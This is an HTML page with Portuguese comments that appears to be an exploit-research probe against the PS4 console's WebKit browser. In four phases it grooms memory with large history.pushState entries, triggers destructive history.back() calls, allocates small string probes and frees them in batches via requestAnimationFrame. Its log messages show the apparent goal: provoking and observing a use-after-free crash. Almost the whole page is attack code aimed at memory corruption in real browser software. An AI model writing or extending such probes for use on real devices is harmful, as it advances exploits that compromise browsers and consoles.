
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Path B (Incremental Free Probe)</title>
<style>
body { font-family: monospace; background: #000; color: #0f0; }
button { font-size: 16px; padding: 10px; }
#log { white-space: pre-wrap; margin-top: 10px; }
</style>
</head>

<body>
<h2>PS4 WebKit – Path B (Incremental Free / rAF)</h2>
<button onclick="run()">RUN PATH B</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }

function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

async function run(){
    log("[*] PATH B START");

    const BASE = 977;
    const STEP = 14461;
    let size = BASE;

    try {
        // -----------------------------
        // FASE 1 – Grooming history
        // -----------------------------
        log("[1] Grooming history");
        for(let i=0;i<35;i++){
            const payload = "A".repeat(size);
            history.pushState({}, "", "#g_" + payload);
            size += STEP;
        }
        log("[1] Grooming done");

        // -----------------------------
        // FASE 2 – Back destrutivo
        // -----------------------------
        log("[2] History back (sync + async)");
        for(let i=0;i<8;i++) history.back();
        await sleep(30);
        for(let i=0;i<4;i++) setTimeout(()=>history.back(),0);
        log("[2] Back scheduled");

        await sleep(60);

        // -----------------------------
        // FASE 3 – Probes pequenos
        // -----------------------------
        log("[3] Allocating small probes");
        let probes = [];
        const TOTAL = 120;
        for(let i=0;i<TOTAL;i++){
            // tamanhos pequenos e distintos
            probes.push("Q" + i + "_" + "Z".repeat(192));
        }
        log("[3] Probes allocated: " + probes.length);

        // -----------------------------
        // FASE 4 – Liberação incremental
        // -----------------------------
        log("[4] Incremental release via rAF");
        let idx = 0;
        const BATCH = 5;

        function frame(){
            // uso leve entre liberações (força leitura)
            if(probes.length >= 3){
                let mix = probes[0] + probes[1] + probes[2];
                log("[use] mix len=" + mix.length);
            }

            // libera pequeno lote
            let released = 0;
            while(released < BATCH && probes.length){
                probes.shift();
                released++;
                idx++;
            }

            log(`[free] released ${released}, remaining ${probes.length}`);

            if(probes.length){
                requestAnimationFrame(frame);
            } else {
                log("[*] All probes released");
                log("[*] PATH B FINISHED WITHOUT CRASH (very informative)");
            }
        }

        requestAnimationFrame(frame);

    } catch(e){
        log("[!] JS Exception: " + e);
    }
}

log("Ready.");
</script>
</body>
</html>
